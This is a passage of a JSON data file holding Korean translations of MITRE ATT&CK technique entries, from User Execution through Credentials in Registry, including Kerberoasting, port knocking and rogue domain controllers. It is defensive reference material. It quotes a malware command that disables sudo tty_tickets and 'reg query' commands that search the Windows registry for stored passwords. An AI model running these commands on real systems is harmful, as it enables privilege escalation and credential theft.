안내하는 콜센터를 홍보하는 등의 방법을 조합하여 사용하여 악성 소프트웨어나 [원격 접근 소프트웨어(Remote Access Software)](https://attack.mitre.org/techniques/T1219)가 포함된 페이로드를 전송하고 실행할 수 있습니다. (인용: 전화 공격 배달)",
      "external_id": "T1204",
      "modified": "2024-11-11T18:52:12.103Z",
      "title": "User Execution",
      "translated": true
    },
    {
      "description": "공격자는 악성 링크를 클릭한 사용자를 통해 실행 권한을 얻을 수 있습니다. 사용자는 코드 실행으로 이어지는 링크를 클릭하도록 유도하기 위해 소셜 엔지니어링의 대상이 될 수 있습니다. 이러한 사용자 행동은 일반적으로 [스피어피싱 링크](https://attack.mitre.org/techniques/T1566/002)에서 관찰되는 후속 행동으로 나타납니다. 링크를 클릭하면 [클라이언트 실행을 위한 취약점 악용](https://attack.mitre.org/techniques/T1203)과 같은 다른 실행 기법으로 이어질 수도 있습니다. 링크는 또한 사용자가 [악성 파일](https://attack.mitre.org/techniques/T1204/002)을 다운로드하여 실행해야 하는 경우로 연결될 수 있습니다.",
      "external_id": "T1204.001",
      "modified": "2024-09-10T16:40:03.786Z",
      "title": "Malicious Link",
      "translated": true
    },
    {
      "description": "공격자는 악성 파일을 열도록 사용자를 유도하여 실행 권한을 얻을 수 있습니다. 사용자는 소셜 엔지니어링을 통해 코드 실행으로 이어질 파일을 열게 유도될 수 있습니다. 이러한 사용자 행동은 보통 [스피어피싱 첨부 파일](https://attack.mitre.org/techniques/T1566/001)에서 나타나는 후속 행동으로 관찰됩니다. 공격자는 .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg 등과 같이 사용자가 실행해야 하는 여러 유형의 파일을 사용할 수 있습니다.\n\n공격자는 사용자가 악성 파일을 열고 성공적으로 실행할 가능성을 높이기 위해 다양한 형태의 [위장](https://attack.mitre.org/techniques/T1036) 및 [오염된 파일 또는 정보](https://attack.mitre.org/techniques/T1027)를 활용할 수 있습니다. 이러한 방법에는 익숙한 명명 규칙을 사용하거나 파일에 암호 보호를 설정하고 파일 여는 방법에 대한 지침을 사용자에게 제공하는 것이 포함됩니다.(출처: 암호 보호된 워드 문서)\n\n[악성 파일](https://attack.mitre.org/techniques/T1204/002)은 초기 접근 직후에 자주 발생하지만, 공격자가 공유 디렉토리나 사용자의 바탕 화면에 파일을 놓아 사용자가 클릭하기를 기대하는 경우와 같이 침투의 다른 단계에서도 발생할 수 있습니다. 이 활동은 또한 [내부 스피어피싱](https://attack.mitre.org/techniques/T1534) 직후에도 관찰될 수 있습니다.",
      "external_id": "T1204.002",
      "modified": "2024-09-25T20:50:34.876Z",
      "title": "Malicious File",
      "translated": true
    },
    {
      "description": "공격자는 악성 이미지를 실행하기 위해 사용자가 해당 이미지를 실행하도록 유도할 수 있습니다. 아마존 웹 서비스(AWS) 아마존 머신 이미지(AMI), 구글 클라우드 플랫폼(GCP) 이미지, Azure 이미지뿐만 아니라 도커와 같은 인기 있는 컨테이너 런타임도 백도어가 설정될 수 있습니다. 백도어가 설정된 이미지는 [악성 코드 업로드](https://attack.mitre.org/techniques/T1608/001)를 통해 공개 리포지토리에 업로드될 수 있으며, 사용자는 이 이미지에서 인스턴스나 컨테이너를 다운로드하여 배포할 때 이미지가 악성인 줄 모르고 진행하게 되어, 초기 접근을 달성하기 위해 고안된 특정 기술을 우회할 수 있습니다. 이는 인스턴스나 컨테이너 내에서 암호화폐 채굴을 수행하는 코드와 같은 악성 코드의 실행으로 이어질 수 있습니다. (출처: Summit Route 악성 AMI)\n\n공격자는 또한 특정 방식으로 이미지를 명명하여 사용자가 실수로 해당 이미지에서 인스턴스나 컨테이너를 배포할 가능성을 높일 수 있습니다(예: [정상적인 이름 또는 위치와 일치하기](https://attack.mitre.org/techniques/T1036/005)). (출처: Aqua Security 클라우드 네이티브 위협 보고서 2021년 6월)",
      "external_id": "T1204.003",
      "modified": "2021-08-26T16:42:35.318Z",
      "title": "Malicious Image",
      "translated": true
    },
    {
      "description": "적대자들은 지속성 또는 명령 및 제어를 위해 사용되는 열린 포트 또는 기타 악성 기능을 숨기기 위해 트래픽 신호를 사용할 수 있습니다. 트래픽 신호란, 시스템에 특별한 응답(예: 닫힌 포트를 열거나 악성 작업을 실행하는 것)을 유발하기 위해 보내야 하는 마법 값 또는 시퀀스를 사용하는 것을 의미합니다. 이는 적대자가 명령 및 제어에 사용할 수 있는 포트를 열기 전에 특정 특성을 가진 패킷 시리즈를 보내는 형식을 취할 수 있습니다. 일반적으로 이 패킷 시리즈는 미리 정의된 닫힌 포트에 대한 연결 시도로 구성되지만(예: [포트 노킹](https://attack.mitre.org/techniques/T1205/001)), 비정상적인 플래그, 특정 문자열 또는 기타 고유한 특성이 포함될 수도 있습니다. 시퀀스가 완료된 후, 포트를 여는 것은 호스트 기반 방화벽에 의해 수행될 수 있지만, 사용자 지정 소프트웨어에 의해 구현될 수도 있습니다.\n\n적대자들은 이미 열린 포트와 통신할 수도 있지만, 해당 포트에서 대기 중인 서비스는 적절한 마법 값이 전달된 경우에만 명령에 응답하거나 다른 악성 기능을 트리거할 것입니다.\n\n통신을 유도하기 위한 신호 패킷의 관찰은 다양한 방법을 통해 수행될 수 있습니다. Cd00r에 의해 처음 구현된 방법 중 하나는 libpcap 라이브러리를 사용하여 문제의 패킷을 스니핑하는 것입니다(Citation: Hartrell cd00r 2002). 다른 방법은 원시 소켓을 활용하여 악성코드가 다른 프로그램에서 이미 사용 중인 포트를 사용할 수 있게 합니다.\n\n네트워크 장치에서는 적대자들이 장치에서 제공하는 표준 서비스(예: 텔넷)를 위한 [네트워크 장치 인증](https://attack.mitre.org/techniques/T1556/004)을 활성화하기 위해 조작된 패킷을 사용할 수 있습니다. 이러한 신호는 닫힌 서비스 포트(예: 텔넷)를 열기 위해 사용되거나 장치의 악성 모듈 수정, 즉 악성 기능의 추가, 제거 또는 변화를 유도하는 데에도 사용될 수 있습니다. 적대자들은 조작된 패킷을 사용하여 하나 이상의(열린 또는 닫힌) 포트에 연결을 시도할 수 있지만, 목표를 달성하기 위해 동일한 포트에서 라우터 인터페이스, 브로드캐스트 및 네트워크 주소 IP에 연결을 시도할 수 있습니다(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks). 내장 장치에서 이 트래픽 신호를 활성화하려면 적대자들은 먼저 [시스템 이미지 패치](https://attack.mitre.org/techniques/T1601/001)를 달성하고 활용해야 합니다. 이는 구조의 단일적인 특성 때문입니다.\n\n적대자들은 또한 Wake-on-LAN 기능을 사용하여 전원이 꺼진 시스템을 켤 수 있습니다. Wake-on-LAN은 전원이 꺼진 시스템을 켜거나 깨우기 위해 마법 패킷을 보내는 하드웨어 기능입니다. 시스템이 켜지면, 수평 이동의 대상이 될 수 있습니다(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet).",
      "external_id": "T1205",
      "modified": "2022-10-19T23:08:40.603Z",
      "title": "Traffic Signaling",
      "translated": true
    },
    {
      "description": "적대자는 지속성 또는 명령 및 제어에 사용되는 열린 포트를 숨기기 위해 포트 노킹(port knocking)을 사용할 수 있습니다. 포트를 활성화하기 위해 적대자는 미리 정의된 닫힌 포트의 순서에 대한 연결 시도를 연속적으로 보냅니다. 이 순서가 완료되면, 포트를 여는 것은 종종 호스트 기반 방화벽에 의해 수행되지만, 맞춤형 소프트웨어를 통해 구현될 수도 있습니다.\n\n이 기술은 동적으로 수신 포트를 열거나 다른 시스템의 수신 서버에 연결을 시작하는 데 사용되는 것이 관찰되었습니다.\n\n통신을 트리거하기 위해 신호 패킷을 관찰하는 것은 여러 방법을 통해 수행될 수 있습니다. 원래 Cd00r에 의해 구현된 방법 중 하나(인용: Hartrell cd00r 2002)는 libpcap 라이브러리를 사용하여 해당 패킷을 스니핑(sniffing)하는 것입니다. 또 다른 방법은 원시 소켓(raw sockets)을 활용하여 악성코드가 이미 다른 프로그램에서 사용 중인 포트를 사용할 수 있게 하는 것입니다.",
      "external_id": "T1205.001",
      "modified": "2022-03-11T18:31:23.996Z",
      "title": "Port Knocking",
      "translated": true
    },
    {
      "description": "적대자들은 네트워크 소켓에 필터를 추가하여 모니터링한 후 지속성 또는 명령 제어를 위한 백도어를 활성화할 수 있습니다. 권한이 상승된 상태에서 적대자들은 `libpcap` 라이브러리와 같은 기능을 사용하여 소켓을 열고 특정 유형의 데이터가 소켓을 통과하도록 허용하거나 거부하는 필터를 설치할 수 있습니다. 필터는 지정된 네트워크 인터페이스를 통과하는 모든 트래픽에 적용될 수 있으며, 명시하지 않을 경우 모든 인터페이스에 적용될 수 있습니다. 네트워크 인터페이스가 필터 기준에 맞는 패킷을 수신하면, 역 셸 활성화와 같은 추가 작업이 호스트에서 트리거될 수 있습니다.\n\n연결을 설정하기 위해, 적대자는 설치된 필터 기준에 맞는 조작된 패킷을 목표 호스트에 전송합니다. 적대자들은 이러한 소켓 필터를 사용하여 임플란트를 설치하고, 핑 백을 수행하며, 명령 셸을 호출하는 등 다양한 행위를 해왔습니다. 이러한 소켓 필터와의 통신은 [프로토콜 터널링](https://attack.mitre.org/techniques/T1572)과 함께 사용될 수 있습니다.\n\n필터는 `libpcap`가 설치된 모든 유닉스 유사 플랫폼이나 `Winpcap`을 사용하는 윈도우 호스트에서 설치할 수 있습니다. 적대자들은 `libpcap`와 `pcap_setfilter`를 사용하거나, 표준 라이브러리 함수 `setsockopt`와 `SO_ATTACH_FILTER` 옵션을 사용할 수 있습니다. 패킷이 수신될 때까지 소켓 연결이 활성화되지 않기 때문에, 이러한 동작은 호스트에서 활동이 없고 CPU 오버헤드가 낮으며 원시 소켓 사용에 대한 가시성이 제한되어 있어 탐지하기 어려울 수 있습니다.",
      "external_id": "T1205.002",
      "modified": "2022-10-20T19:56:18.579Z",
      "title": "Socket Filters",
      "translated": true
    },
    {
      "description": "<code>sudo</code> 명령어는 \"시스템 관리자가 특정 사용자(또는 사용자 그룹)에게 root 또는 다른 사용자로 일부(또는 모든) 명령을 실행할 수 있는 권한을 위임하고, 명령 및 해당 인수의 감사 내역을 제공할 수 있게 해준다.\" (인용: sudo 매뉴얼 페이지 2018). sudo는 시스템 관리자를 위해 설계되었으므로, <code>timestamp_timeout</code>과 같은 유용한 구성 기능을 제공한다. 이는 sudo를 사용한 두 번의 실행 사이의 시간을 분 단위로 나타내며, 일정 기간 동안 자격 증명을 캐시할 수 있기 때문에 비밀번호를 다시 입력하라는 메시지를 표시한다. Sudo는 sudo가 마지막으로 실행된 시간을 기록한 타임스탬프 파일을 <code>/var/db/sudo</code>에 생성(또는 터치)하여 이 타임아웃을 결정한다. 또한, <code>tty_tickets</code> 변수는 각 새 tty(터미널 세션)를 독립적으로 처리한다. 이는 예를 들어, 한 tty의 sudo 타임아웃이 다른 tty에 영향을 미치지 않음을 의미하며, 해당 사용자는 비밀번호를 다시 입력해야 한다.\n\n공격자들은 이 설정이 잘못되어 있는 경우, 사용자의 비밀번호 없이 권한 상승을 악용할 수 있다. <code>/var/db/sudo</code>의 타임스탬프를 모니터링하여 <code>timestamp_timeout</code> 범위 내에 있는지 확인할 수 있다. 만약 범위 내에 있다면, 악성 코드는 사용자의 비밀번호를 입력할 필요 없이 sudo 명령을 실행할 수 있다. <code>tty_tickets</code>가 비활성화되면, 공격자는 해당 사용자의 어떤 tty에서도 이를 수행할 수 있다.\n\nOSX Proton 악성 코드는 <code>tty_tickets</code>를 비활성화하여 스크립팅을 용이하게 하기 위해 <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>를 실행하였다. (인용: cybereason osx proton). 이 변경 사항이 반영되기 위해 Proton 악성 코드는 <code>killall Terminal</code> 명령을 실행해야 한다. macOS Sierra부터 sudoers 파일은 기본적으로 <code>tty_tickets</code>가 활성화되어 있다.",
      "external_id": "T1206",
      "modified": "2020-02-05T20:10:18.586Z",
      "title": "Sudo Caching",
      "translated": true
    },
    {
      "description": "공격자는 Active Directory 데이터를 조작하기 위해 로우그 도메인 컨트롤러(Domain Controller, DC)를 등록할 수 있습니다. DCShadow는 로우그 도메인 컨트롤러(DC)를 생성하는 데 사용될 수 있으며, 이는 DC의 동작을 시뮬레이션하고 비활성 등록을 재사용하거나 새로 등록하여 Active Directory(AD) 데이터를 조작하는 방법입니다. 등록이 완료되면, 로우그 DC는 AD 인프라에 있는 모든 도메인 객체, 즉 자격 증명과 키를 포함한 변경사항을 주입하고 복제할 수 있습니다.\n\n로우그 DC를 등록하는 과정은 AD 스키마의 구성 파티션에 새로운 서버와 nTDSDSA 객체를 생성하는 것을 포함하며, 이는 관리자 권한(도메인 또는 DC에 로컬로)이나 KRBTGT 해시가 필요합니다.\n\n이 기술은 시스템 로그 및 보안 모니터링(예: 보안 정보 및 이벤트 관리, SIEM 제품)을 우회할 수 있습니다. 로우그 DC에서 수행된 작업은 이러한 센서에 보고되지 않을 수 있기 때문입니다. 또한, 해당 기술은 복제 및 기타 관련 메타데이터를 수정 및 삭제하여 포렌식 분석을 방해하는 데 사용할 수도 있습니다. 공격자는 또한 이 기술을 활용하여 SID-History Injection을 수행하거나 AD 객체(예: 계정, 접근 제어 목록, 스키마)를 조작하여 지속성을 위한 백도어를 설정할 수 있습니다.",
      "external_id": "T1207",
      "modified": "2022-03-08T21:20:04.850Z",
      "title": "Rogue Domain Controller",
      "translated": true
    },
    {
      "description": "서비스 주체 이름(Service Principal Names, SPNs)은 각 Windows 서비스 인스턴스를 고유하게 식별하는 데 사용됩니다. 인증을 가능하게 하려면 Kerberos는 SPNs가 최소 하나의 서비스 로그인 계정과 연결되어 있어야 합니다(서비스를 실행하기 위해 특별히 지정된 계정) (인용: Microsoft Kerberoasting 탐지 2018년 2월). (인용: Microsoft SPN) (인용: Microsoft SetSPN) (인용: SANS Kerberos 공격 2014년 11월) (인용: Harmj0y Kerberoast 2016년 11월)\n\n유효한 Kerberos 티켓 부여 티켓(TGT)을 소지한 공격자는 도메인 컨트롤러(DC)에서 특정 SPN에 대한 하나 이상의 Kerberos 티켓 부여 서비스(TGS) 서비스 티켓을 요청할 수 있습니다. (인용: Empire InvokeKerberoast 2016년 10월) (인용: AdSecurity Kerberos 해킹 2015년 12월) 이러한 티켓의 일부는 RC4 알고리즘으로 암호화될 수 있으며, 이는 해당 SPN과 연결된 서비스 계정의 Kerberos 5 TGS-REP etype 23 해시가 개인 키로 사용되어 오프라인 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110)에 취약해 plaintext 자격 증명이 노출될 수 있음을 의미합니다. (인용: AdSecurity Kerberos 해킹 2015년 12월) (인용: Empire InvokeKerberoast 2016년 10월) (인용: Harmj0y Kerberoast 2016년 11월)\n\n이와 같은 공격은 네트워크 트래픽에서 캡처한 서비스 티켓을 사용하여 실행될 수 있습니다. (인용: AdSecurity Kerberos 해킹 2015년 12월)\n\n해킹된 해시는 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 접근을 통해 지속성, 권한 상승 및 측면 이동을 가능하게 할 수 있습니다. (인용: SANS Kerberos 공격 2014년 11월)",
      "external_id": "T1208",
      "modified": "2020-10-20T19:30:10.297Z",
      "title": "Kerberoasting",
      "translated": true
    },
    {
      "description": "Windows 시간 서비스(W32Time)는 도메인 내 및 도메인 간의 시간 동기화를 가능하게 합니다. (인용: Microsoft W32Time 2018년 2월) W32Time 시간 공급자는 하드웨어/네트워크 리소스로부터 타임스탬프를 가져오고 이러한 값을 다른 네트워크 클라이언트에 출력하는 책임을 집니다. (인용: Microsoft TimeProvider)\n\n시간 공급자는 동적 링크 라이브러리(DLL)로 구현되며, <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>의 하위 키에 등록됩니다. (인용: Microsoft TimeProvider) 서비스 제어 관리자가 지시하는 시간 공급자 관리자(Time Provider Manager)는 시스템 시작 시 및/또는 매개변수가 변경될 때 이 키 아래에 나열되고 활성화된 시간 공급자를 로드하고 시작합니다. (인용: Microsoft TimeProvider)\n\n공격자들은 이 아키텍처를 악용하여 지속성을 설정할 수 있으며, 구체적으로 악성 DLL을 시간 공급자로 등록하고 활성화함으로써 이루어질 수 있습니다. 시간 공급자 등록에는 관리자 권한이 필요하지만, 실행은 로컬 서비스 계정의 컨텍스트에서 이루어집니다. (인용: Github W32Time 2017년 10월)",
      "external_id": "T1209",
      "modified": "2020-01-24T16:48:50.715Z",
      "title": "Time Providers",
      "translated": true
    },
    {
      "description": "적대적인 주체는 네트워크 내부에 침입한 후 원격 서비스를 악용하여 내부 시스템에 무단으로 접근할 수 있습니다. 소프트웨어 취약점의 악용은 적대적인 주체가 프로그램, 서비스 또는 운영 체제 소프트웨어 또는 커널 자체의 프로그래밍 오류를 이용하여 그들이 제어하는 코드를 실행할 때 발생합니다. 원격 서비스의 침해 이후 악용의 일반적인 목표는 측면 이동을 통해 원격 시스템에 접근할 수 있도록 하는 것입니다.\n\n적대적인 주체는 원격 시스템이 취약한 상태인지 확인해야 할 필요가 있으며, 이는 [네트워크 서비스 탐색](https://attack.mitre.org/techniques/T1046) 또는 네트워크에 배포될 수 있는 일반적인 취약한 소프트웨어, 특정 취약점을 나타낼 수 있는 패치의 부재 또는 원격 악용을 탐지하거나 차단하기 위해 사용되는 보안 소프트웨어를 찾는 다른 탐색 방법을 통해 수행할 수 있습니다. 서버는 측면 이동 악용의 고가치 목표가 될 가능성이 높지만, 추가 리소스에 대한 이점이나 접근을 제공하는 경우 엔드포인트 시스템 또한 위험에 처할 수 있습니다.\n\n일반 서비스에서 존재하는 여러 가지 잘 알려진 취약점이 있으며, 예를 들어 SMB (인용: CIS 다수의 SMB 취약점) 및 RDP (인용: NVD CVE-2017-0176)와 같은 서비스 뿐만 아니라 내부 네트워크 내에서 사용될 수 있는 MySQL (인용: NVD CVE-2016-6662) 및 웹 서버 서비스 (인용: NVD CVE-2014-7169)와 같은 애플리케이션에도 해당됩니다.\n\n취약한 원격 서비스의 권한 수준에 따라, 적대적인 주체는 측면 이동 악용의 결과로 [특권 상승을 위한 악용](https://attack.mitre.org/techniques/T1068)을 달성할 수 있습니다.",
      "external_id": "T1210",
      "modified": "2022-02-24T15:06:46.006Z",
      "title": "Exploitation of Remote Services",
      "translated": true
    },
    {
      "description": "적대자들은 시스템이나 애플리케이션의 취약점을 악용하여 보안 기능을 우회할 수 있습니다. 취약점의 악용은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어나 커널 자체의 프로그래밍 오류를 이용하여 적대자가 제어하는 코드를 실행할 때 발생합니다. 방어적 보안 소프트웨어 내에도 존재할 수 있는 취약점이 있으며, 이를 통해 해당 소프트웨어를 비활성화하거나 우회할 수 있습니다.\n\n적대자들은 환경 내에 보안 소프트웨어가 존재한다는 것에 대한 사전 지식이 있을 수 있으며, 시스템이 손상되었을 때 또는 직후에 [보안 소프트웨어 발견](https://attack.mitre.org/techniques/T1518/001)을 위한 검사를 수행할 수 있습니다. 보안 소프트웨어는 악용의 주요 대상이 될 가능성이 높습니다. 지속적인 위협 그룹들이 탐지를 피하기 위해 안티바이러스 소프트웨어를 목표로 하는 사례가 있습니다.\n\n또한, 방어 경계를 우회할 수 있는 SaaS 애플리케이션의 공용 클라우드 인프라 내의 취약점 사례도 존재합니다. (출처: 페이스북 피싱 공격의 세일즈포스 제로데이), 보안 로그를 피하는 경우 (출처: AWS 서비스 카탈로그에서 CloudTrail 우회), 또는 숨겨진 인프라를 배포하는 경우도 있습니다. (출처: GhostToken GCP 결함)",
      "external_id": "T1211",
      "modified": "2023-10-15T11:41:47.274Z",
      "title": "Exploitation for Defense Evasion",
      "translated": true
    },
    {
      "description": "적대자들은 자격 증명을 수집하기 위한 시도로 소프트웨어 취약점을 악용할 수 있습니다. 소프트웨어 취약점의 악용은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어 또는 커널 자체 내의 프로그래밍 오류를 이용하여 적대자가 제어하는 코드를 실행할 때 발생합니다.\n\n적대자들은 유용한 자격 증명에 접근하거나 시스템에 대한 인증된 접근을 얻기 위해 인증 및 자격 증명 메커니즘을 목표로 악용할 수 있습니다. 그 예로는 Kerberos를 목표로 하는 `MS14-068`이 있으며, 이는 도메인 사용자 권한을 사용하여 Kerberos 티켓을 위조하는 데 사용될 수 있습니다. (출처: Technet MS14-068) (출처: ADSecurity Detecting Forged Tickets) 또 다른 예는 리플레이 공격으로, 적대자가 당사자 간에 전송된 데이터 패킷을 가로채고 이후에 이 패킷을 재전송하는 것입니다. 서비스가 인증 요청을 올바르게 검증하지 않으면, 이런 리플레이된 패킷은 적대자가 당사자 중 하나로 가장하여 무단 접근이나 권한을 얻을 수 있게 할 수 있습니다. (출처: Bugcrowd Replay Attack) (출처: Comparitech Replay Attack) (출처: Microsoft Midnight Blizzard Replay Attack)\n\n이러한 악용은 클라우드 환경에서도 입증되었습니다. 예를 들어, 적대자들은 의도치 않은 인증 토큰 생성 및 갱신을 허용하는 공공 클라우드 인프라의 취약점을 악용하였습니다. (출처: Storm-0558 techniques for unauthorized email access)\n\n자격 증명 접근을 위한 악용은 표적이 된 프로세스나 얻어진 자격 증명에 따라 권한 상승으로 이어질 수 있습니다.",
      "external_id": "T1212",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Exploitation for Credential Access",
      "translated": true
    },
    {
      "description": "적대자는 정보 저장소를 활용하여 귀중한 정보를 발굴할 수 있습니다. 정보 저장소는 사용자가 협업하거나 정보를 공유할 수 있도록 정보를 저장할 수 있게 해주는 도구로, 적대자가 자격 증명 접근, 측면 이동, 방어 회피 또는 목표 정보에 대한 직접 접근과 같은 추가 목표를 수행하는 데 도움이 될 수 있는 다양한 데이터를 저장할 수 있습니다. 적대자는 또한 외부 공유 기능을 악용하여 조직 외부의 수신자와 민감한 문서를 공유할 수 있습니다 (예: [데이터 클라우드 계정으로 전송](https://attack.mitre.org/techniques/T1537)).\n\n아래는 적대자에게 잠재적 가치를 가질 수 있는 예시 정보의 간략한 목록으로, 정보 저장소에서 발견될 수 있습니다:\n\n* 정책, 절차 및 표준\n* 물리적 / 논리적 네트워크 다이어그램\n* 시스템 아키텍처 다이어그램\n* 기술 시스템 문서\n* 테스트 / 개발 자격 증명 (예: [안전하지 않은 자격 증명](https://attack.mitre.org/techniques/T1552))\n* 작업 / 프로젝트 일정\n* 소스 코드 조각\n* 네트워크 공유 및 기타 내부 리소스에 대한 링크\n* 사업 파트너 및 고객에 대한 연락처 또는 기타 민감한 정보, 개인 식별 정보(PII) 포함\n\n저장소에 저장된 정보는 특정 인스턴스나 환경에 따라 달라질 수 있습니다. 특정 일반 정보 저장소에는 다음이 포함됩니다:\n\n* IaaS 데이터베이스, 기업 데이터베이스 및 고객 관계 관리(CRM) 데이터베이스와 같은 특화된 플랫폼과 같은 저장 서비스\n* SharePoint, Confluence 및 코드 저장소와 같은 협업 플랫폼\n* Slack 및 Microsoft Teams와 같은 메시징 플랫폼\n\n일부 경우, 정보 저장소는 부적절하게 보안이 설정되어 있으며, 일반적으로 모든 사용자 또는 심지어 인증되지 않은 사용자에게 과도한 접근을 허용하는 경우가 많습니다. 이는 AWS 관계형 데이터베이스 서비스(RDS), Redis 또는 ElasticSearch와 같은 클라우드 네이티브 또는 클라우드 호스팅 서비스에서 특히 흔합니다. (출처: Mitiga)(출처: TrendMicro Exposed Redis 2020)(출처: Cybernews Reuters Leak 2022)",
      "external_id": "T1213",
      "modified": "2024-10-28T19:10:16.960Z",
      "title": "Data from Information Repositories",
      "translated": true
    },
    {
      "description": "적대자는 Confluence 리포지토리를 활용하여 귀중한 정보를 수집할 수 있습니다. Confluence는 일반적으로 Atlassian JIRA와 함께 개발 환경에서 발견되며, 개발 관련 문서를 저장하는 데 사용되지만, 전반적으로 다음과 같은 다양한 유용한 정보 범주를 포함할 수 있습니다:\n\n* 정책, 절차 및 기준\n* 물리적/논리적 네트워크 다이어그램\n* 시스템 아키텍처 다이어그램\n* 기술 시스템 문서\n* 테스트/개발 자격 증명 (예: [보안이 취약한 자격 증명](https://attack.mitre.org/techniques/T1552))\n* 작업/프로젝트 일정\n* 소스 코드 스니펫\n* 네트워크 공유 및 기타 내부 리소스에 대한 링크",
      "external_id": "T1213.001",
      "modified": "2024-08-30T13:45:42.840Z",
      "title": "Confluence",
      "translated": true
    },
    {
      "description": "적대자는 SharePoint 리포지토리를 유용한 정보를 추출하는 수단으로 활용할 수 있습니다. SharePoint에는 내부 네트워크 및 시스템의 구조와 기능에 대해 적대자가 알기에 유용한 정보가 자주 포함되어 있습니다. 예를 들어, 다음은 적대자에게 잠재적인 가치를 지닐 수 있는 정보의 예 목록이며, SharePoint에서 발견될 수 있습니다:\n\n* 정책, 절차 및 기준\n* 물리적/논리적 네트워크 다이어그램\n* 시스템 아키텍처 다이어그램\n* 기술 시스템 문서\n* 테스트/개발 자격 증명 (즉, [보안되지 않은 자격 증명](https://attack.mitre.org/techniques/T1552))\n* 작업/프로젝트 일정\n* 소스 코드 조각\n* 네트워크 공유 및 기타 내부 리소스에 대한 링크",
      "external_id": "T1213.002",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Sharepoint",
      "translated": true
    },
    {
      "description": "적대자는 코드 저장소를 활용하여 귀중한 정보를 수집할 수 있습니다. 코드 저장소는 소스 코드를 저장하고 소프트웨어 빌드를 자동화하는 도구/서비스입니다. 이러한 저장소는 내부 또는 GitHub, GitLab, SourceForge, BitBucket과 같은 제3자 사이트에 개인적으로 호스팅될 수 있습니다. 사용자는 일반적으로 웹 애플리케이션 또는 git과 같은 명령줄 유틸리티를 통해 코드 저장소와 상호 작용합니다.\n\n적대자가 피해자의 네트워크 또는 개인 코드 저장소에 접근하게 되면, 그들은 소프트웨어의 소스 코드에 포함된 독점적인 소스 코드나 [보안되지 않은 자격 증명](https://attack.mitre.org/techniques/T1552)과 같은 민감한 정보를 수집할 수 있습니다. 소프트웨어의 소스 코드에 접근할 수 있다면, 적대자는 [익스플로잇](https://attack.mitre.org/techniques/T1587/004)을 개발할 수 있으며, 자격 증명은 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 통해 추가 리소스에 접근할 수 있게 해줄 수 있습니다. (인용: Wired Uber Breach)(인용: Krebs Adobe)\n\n**노트:** 이는 공용 코드 저장소를 통해 [정찰](https://attack.mitre.org/tactics/TA0043)을 수행하는 데 중점을 둔 [코드 저장소](https://attack.mitre.org/techniques/T1593/003)와는 구별됩니다.",
      "external_id": "T1213.003",
      "modified": "2024-09-04T13:03:54.101Z",
      "title": "Code Repositories",
      "translated": true
    },
    {
      "description": "대적자는 고객 관계 관리(CRM) 소프트웨어를 활용하여 귀중한 정보를 채굴할 수 있습니다. CRM 소프트웨어는 조직이 고객과의 상호 작용을 추적하고 관리하며 고객 데이터를 저장하는 데 도움을 주기 위해 사용됩니다.\n\n대적자가 피해 조직에 접근하게 되면 CRM 소프트웨어를 통해 고객 데이터를 채굴할 수 있습니다. 여기에는 전체 이름, 이메일, 전화번호, 주소와 같은 개인 식별 정보(PII)뿐만 아니라 구매 내역 및 IT 지원 상호작용과 같은 추가 세부 정보가 포함될 수 있습니다. 이 데이터를 수집함으로써 대적자는 개인화된 피싱 이메일을 보내거나 SIM 스와핑을 수행하거나, 재정적 이익 또는 추가 조직의 침해를 가능하게 하는 방식으로 조직의 고객을 타겟할 수 있습니다. (출처: Bleeping Computer US Cellular Hack 2022)(출처: Bleeping Computer Mint Mobile Hack 2021)(출처: Bleeping Computer Bank Hack 2020)\n\nCRM 소프트웨어는 온프레미스 또는 클라우드에 호스팅될 수 있습니다. 이러한 솔루션에 저장된 정보는 특정 인스턴스나 환경에 따라 다를 수 있습니다. CRM 소프트웨어의 예로는 Microsoft Dynamics 365, Salesforce, Zoho, Zendesk 및 HubSpot이 있습니다.",
      "external_id": "T1213.004",
      "modified": "2024-10-17T14:36:24.983Z",
      "title": "Customer Relationship Management Software",
      "translated": true
    },
    {
      "description": "적대 세력은 Microsoft Teams, Google Chat 및 Slack과 같은 채팅 및 메시징 애플리케이션을 활용하여 귀중한 정보를 탐색할 수 있습니다.\n\n다음은 적대 세력에게 잠재적 가치를 지닐 수 있는 정보의 간단한 목록이며, 메시징 애플리케이션에서 발견될 수 있습니다:\n\n* 테스트 / 개발 자격 증명 (예: [채팅 메시지](https://attack.mitre.org/techniques/T1552/008))\n* 소스 코드 스니펫\n* 네트워크 공유 및 기타 내부 자원에 대한 링크\n* 독점 데이터 (출처: Guardian Grand Theft Auto 유출 2022)\n* 진행 중인 사고 대응 노력에 대한 논의 (출처: SC 매거진 Ragnar Locker 2021) (출처: Microsoft DEV-0537)\n\n메시징 애플리케이션에서 데이터를 유출하는 것 외에도, 적대 세력은 채팅 메시지에서 데이터를 활용하여 타겟팅을 개선할 수 있습니다. 예를 들어, 환경에 대해 더 많이 파악하거나 진행 중인 사고 대응 노력을 회피하는 방식으로요. (출처: Sentinel Labs NullBulge 2024) (출처: Permiso Scattered Spider 2023)",
      "external_id": "T1213.005",
      "modified": "2024-10-16T14:22:49.146Z",
      "title": "Messaging Applications",
      "translated": true
    },
    {
      "description": "윈도우 레지스트리는 시스템이나 다른 프로그램에서 사용할 수 있는 구성 정보를 저장합니다. 공격자는 레지스트리를 조회하여 다른 프로그램이나 서비스에서 사용하기 위해 저장된 자격 증명과 비밀번호를 찾을 수 있습니다. 때때로 이러한 자격 증명은 자동 로그인에 사용됩니다.\n\n비밀번호 정보와 관련된 레지스트리 키를 찾기 위한 예제 명령어: (출처: Pentestlab Stored Credentials)\n\n* 로컬 머신 하이브: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* 현재 사용자 하이브: <code>reg query HKCU /f password /t REG_SZ /s</code>",
      "external_id": "T1214",
      "modified": "2020-02-04T12:59:37.464Z",
      "title": "Credentials in Registry",
